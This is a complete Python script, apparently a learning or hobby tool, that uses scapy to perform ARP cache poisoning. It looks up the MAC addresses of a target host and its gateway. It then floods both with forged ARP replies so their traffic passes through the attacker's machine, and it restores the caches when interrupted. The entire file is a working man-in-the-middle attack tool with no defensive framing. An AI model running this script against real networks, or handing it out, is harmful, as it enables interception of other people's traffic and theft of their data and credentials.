from scapy.all import *
import os
import sys

conf.color_theme = BrightTheme()

def mac_getter(target_ip):
    '''
    This function returns the mac adress of the target_ip by sending an ARP REQUEST

    target_ip:  Target IP, we will return it's MAC

    returns: Target MAC ADR

    '''

    eth = Ether()
    eth.dst = "ff:ff:ff:ff:ff:ff"

    arp_who_has = ARP()

    arp_who_has.op = 1 # WHO HAS MODE
    arp_who_has.hwdst = '00:00:00:00:00:00' #WE WANT TO KNOW THAT MAC ADR
    arp_who_has.pdst = target_ip #FROM THAT HOST

    arp_who_has =  eth/arp_who_has
    arp_who_has.show()
    MAC = srp(arp_who_has, timeout = 2, verbose = False)[0][0][1].hwsrc
    return MAC

def poisoning(target_ip, target_MAC, source_ip):
    '''
    This function poisons the ARP cache of the target_ip/target_MAC host.
    It will send an ARP message with your MAC adress to the target_ip, indicating you are the source_ip host.

    target_ip: Target IP, we will spoof this host
    target_MAC: Target MAC, we will spoof this host
    source_ip: Kind of a second targert host. We will impersonate this host with our MAC.

    '''
    arp_poison = ARP()
    arp_poison.op = 2
    arp_poison.pdst = target_ip
    arp_poison.psrc = source_ip
    arp_poison.hwdst = target_MAC
    send(arp_poison, verbose = False)

def restore_cache(target_ip,target_MAC,source_ip,source_MAC):
    '''
    This function restores ARP cache for host target_ip/target_MAC.

    target_ip : Target IP, we will restore ARP cache for this host
    target_MAC : Target MAC, we will restore ARP cache for this host
    source_ip : IP to be restored
    source_MAC: MAC to be restored

    '''
    arp_restore = ARP()
    arp_restore.op = 2
    arp_restore.hwsrc = source_MAC
    arp_restore.psrc = source_ip
    arp_restore.hwdst = target_MAC
    arp_restore.pdst = target_ip

    send(arp_restore, verbose = False)
    print("Restored ARP cache for host:",target_ip)


def main():

    target_ip = sys.argv[1] # TARGET IS WHO DEMMANDS ARP REQUEST
    gateway_ip = sys.argv[2] # GATEWAY IS WHO THEORICALLY SHOULD REPLY THE REQUEST

    try:
        target_MAC = mac_getter(target_ip)
        print("[TARGET] MAC adress : ",target_MAC)

    except:

        print("No host found with IP:",target_ip,"or host did not reply to ARP")
        quit()

    try:
        gateway_MAC = mac_getter(gateway_ip)
        print("[GATEWAY] MAC adress : ",gateway_MAC)

    except:

        print("No host found with IP:",gateway_ip,"or host did not reply to ARP")
        quit()


    print("Poisoning ARP cache...")

    try:
        while True:
            poisoning(target_ip,target_MAC,gateway_ip)
            poisoning(gateway_ip,gateway_MAC, target_ip)
    # RESTORE ARP CACHES #
    except KeyboardInterrupt:
        print ("Restoring ARP caches...")
        restore_cache(gateway_ip,gateway_MAC,target_ip,target_MAC)
        restore_cache(target_ip,target_MAC,gateway_ip,gateway_MAC)
        quit()

main()
